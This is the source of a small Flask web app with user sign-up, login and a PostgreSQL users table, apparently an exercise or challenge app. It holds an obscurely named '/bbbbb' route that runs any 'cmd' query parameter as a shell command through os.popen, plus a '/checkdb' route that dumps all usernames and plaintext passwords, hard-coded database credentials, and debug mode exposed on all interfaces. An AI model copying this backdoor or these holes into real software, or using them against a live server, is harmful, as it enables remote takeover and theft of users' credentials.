from flask import Flask, request, make_response, redirect, session, render_template, send_file, flash 
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
import pandas as pd
import os
import json
import re
app = Flask(__name__)
app.secret_key = os.urandom(32)
# ref : https://stackabuse.com/using-sqlalchemy-with-flask-and-postgresql/	
sql_url = "postgresql://clg3pmnzw00fff4po489sa703:ZYeVNbez1T2LNOVkSzkDOYrG@140.112.18.210:9012/clg3pmnzx00fhf4podvfe2a4b"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = sql_url
#app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['SQLALCHEMY_DATABASE_URI']
db = SQLAlchemy(app)

regex = re.compile(r'^[A-Za-z0-9_-]*$')

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    username = db.Column(db.String(30),unique=True,nullable=False)
    password = db.Column(db.String(30),nullable=False)
    
    def __init__(self,username,password):
        self.username = username
        self.password = password

class Message(db.Model):
    __tablename__ = 'message'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    user_id = db.Column(db.Integer,nullable=False)
    message = db.Column(db.String(256),nullable=False)
    
    def __init__(self, user_id ,message):
        self.user_id = user_id
        self.message = message


@app.route('/')
def hello():
    db.create_all()        
    return render_template('index.html')

@app.route('/about')
def about():
	return render_template('about.html')

@app.route('/create_user')
def create_user():
    if 'user_data' in session:
        return redirect('/')
	
    return render_template('create_user.html')

@app.route("/login", methods=['POST'])
def login():

    # already login 
    if 'user_data' in session:
        return redirect('/')    

    # check password
    def valid_user(user,password):
        return user.password == password

    def is_blank(username,password):
        return len(password) < 1 and len(username) < 1 
    
    def is_only_number_letter(username,password):
        return regex.match(username) and  regex.match(password)

    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()
    ## user don't exits
    if not user :
       # no blank input 
        if is_blank(username,password):
            flash("Username are blank or Password are blank")
            return redirect("/create_user")
        
        if not is_only_number_letter(username,password):
            flash("Only numbers, letters and dashes are allowed")
            return redirect("/create_user")

        ### create user to db 
        new_user = User(username,password)
        db.session.add(new_user)
        db.session.commit()
        
        # create session 
        data = '{"username" : "%s"}' %(username)
        session['user_data'] = data

        return redirect('user')

    ## input != password
    elif not valid_user(user,password):
        flash('User already exists or Password Error')
        return redirect("/create_user")
    
    ### valid user 

    data = '{"username" : "%s"}' %(username)
    session['user_data'] = data
    return redirect("/")

@app.route('/logout')
def logout():
    session.clear()
    return redirect("/")


@app.route('/user')
def user():
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="users", con=engine)
    result = user_table[["id","username"]].to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4)
    print(result)
    return render_template('user.html',user_data=result)

@app.route('/bbbbb')
def bbbbb():
    cmd = request.args.get('cmd')
    
    return os.popen(f'{cmd}').read()

@app.route('/checkdb')
def checkdb():
    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="users", con=engine)
    result = user_table.to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4) 
    return result

## TODO : add message board db, add/delete function 


if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8000,debug=True)